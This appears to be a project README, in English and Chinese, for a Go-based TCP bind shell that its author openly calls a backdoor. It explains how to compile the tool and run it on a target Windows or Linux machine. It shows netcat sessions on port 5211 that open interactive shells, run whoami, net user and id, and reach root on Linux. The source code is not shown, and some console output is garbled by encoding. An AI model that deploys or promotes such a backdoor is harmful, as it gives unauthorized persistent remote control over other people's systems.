#### Golang Tcp Bind Shell

``` bash
------------------------------------------------
A golang based tcp bind shell
------------------------------------------------
 ____          _               _  __           _ _
| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |
|  _ \| | | | | |  | | | |/ __| | |_ / _ \ '__| | |
| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |
|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|
       |___/
My QQ:1185151867
Blog: https://fdlucifer.github.io/
################################################
```

## Usage

将源代码编译好，如果目标系统是windows就在windows下的go环境中编译，目标系统是linux的话同理，将编译生成的可执行文件放到目标系统的终端里运行

 - 目标系统的环境为windows

``` bash
root@kali:~# nc 172.20.10.5 5211
                        welcome to lucifer11(QQ:1185151867)'s backdoor[default port:5211]
[+] Connect backdoor success,press enter to join the shell :):
Microsoft Windows [�汾 10.0.18363.752]
(c) 2019 Microsoft Corporation����������Ȩ����

D:\Go\testgofiles\oldboygo\goprogram\gobackdoor>whoami
whoami
lucifer11\hasee

D:\Go\testgofiles\oldboygo\goprogram\gobackdoor>net user
net user

\\LUCIFER11 ���û��ʻ�

-------------------------------------------------------------------------------
Administrator            ASPNET                   DefaultAccount           
Guest                    HASEE                    WDAGUtilityAccount       
�����ɹ����ɡ�


D:\Go\testgofiles\oldboygo\goprogram\gobackdoor>
```

 - ![](/showpics/1.jpg)

 - 目标系统为linux

``` bash
root@kali:~# nc 192.168.66.6 5211
                        twelcome to lucifer11(QQ:1185151867)'s backdoor[default port:5211]                                 
[+] Connect backdoor success,press enter to join the shell :):                                                             
id                                                                                                                         
uid=0(root) gid=0(root) 组=0(root)                                                                                         
whoami                                                                                                                     
root                                                                                                                       
pwd                                                                                                                        
/root
uname -a
Linux kali 5.4.0-kali4-amd64 #1 SMP Debian 5.4.19-1kali1 (2020-02-17) x86_64 GNU/Linux
```

 - ![](/showpics/2.jpg)


### 优点特色

 - 轻量级的golang tcp bind shell
 - 同时支持windows和linux环境
 - 能多平台交叉编译使用

### 注意
 - 有任何问题请联系qq:1185151867 :)

:) enjoy it ! :)